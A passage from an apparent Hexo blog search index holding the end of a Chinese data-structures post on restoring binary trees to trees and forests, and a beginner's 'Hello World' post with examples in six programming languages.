src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A3%AE%E6%9E%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="森林转换为二叉树"></p><h3 id="二叉树还原为树"><a class="markdownIt-Anchor" href="#二叉树还原为树"></a> 二叉树还原为树</h3><p>二叉树还原为树就是树转换为二叉树的逆过程，直接反过来做就可以</p><p>步骤如下：</p><p>1、加线：若某结点的左孩子结点存在，则将这个左孩子的右孩子结点，右孩子的右孩子结点，右孩子的右孩子的</p><p>右孩子结点…哈哈，就是左孩子的n个右孩子结点都作为结点的孩子，将该结点与这些右孩子结点用线连接起来；</p><p>2、去线：删除原二叉树中所有结点与其右孩子结点的连线；</p><p>3、旋转：旋转得到树</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A0%91.png" alt="二叉树还原为树"></p><h3 id="二叉树还原为森林"><a class="markdownIt-Anchor" href="#二叉树还原为森林"></a> 二叉树还原为森林</h3><p>判断一棵二叉树能够转换成树还是森林，很简单，只要看这棵二叉树的根结点有没有右孩子，有就是森林，没有就</p><p>是一棵树，如果是森林，步骤如下：</p><p>1、从根结点开始，若右孩子存在，则把它与右孩子结点的连线删除，再查看分离后的二叉树，若右孩子存在，则</p><p>连线删除…，直到所有右孩子连线都删除为止，得到分离的二叉树；</p><p>2、再将每棵分离后的二叉树转换为树即可；</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A3%AE%E6%9E%97.png" alt="二叉树还原为森林"></p><h2 id="二叉树应用"><a class="markdownIt-Anchor" href="#二叉树应用"></a> 二叉树应用</h2><p><em><strong>赫夫曼树</strong></em></p><p><em><strong>赫夫曼编码</strong></em></p><h2 id="小结-6"><a class="markdownIt-Anchor" href="#小结-6"></a> 小结</h2><p>这一章讲的是树🌳，重点学习了二叉树，要牢牢掌握其算法，再了解一下它的应用</p><p>emm 下一章讲 “图” ，这个是一点没有接触过的内容了😀</p><p>.</p><p>.</p><p>.</p><p><strong>end</strong></p><p><strong>goodbye~</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/hello-world/"/>
      <url>/posts/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>Welcome to Hexo！！</p><p>我是一名计算机小白，这是我的第一篇博客，不足之处，请多指教；</p><p>学习语言最基本了解它大概长什么样子，下面通过打印Hello World！来了解了解；</p><a id="more"></a><h4 id="打印hello-world"><a class="markdownIt-Anchor" href="#打印hello-world"></a> 打印"Hello World!"</h4><h5 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="c-2"><a class="markdownIt-Anchor" href="#c-2"></a> C++</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello World!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h5><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Hello World!"</span>);</span><br></pre></td></tr></tbody></table></figure><h5 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h5><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h5 id="c-3"><a class="markdownIt-Anchor" href="#c-3"></a> C#</h5><figure class="highlight c#"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">HelloWorld</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">class</span> <span class="title">HelloWorld</span></span><br><span class="line">    {</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span>{</span><br><span class="line">            Console.WriteLine(<span class="string">"Hello World!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Testing </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
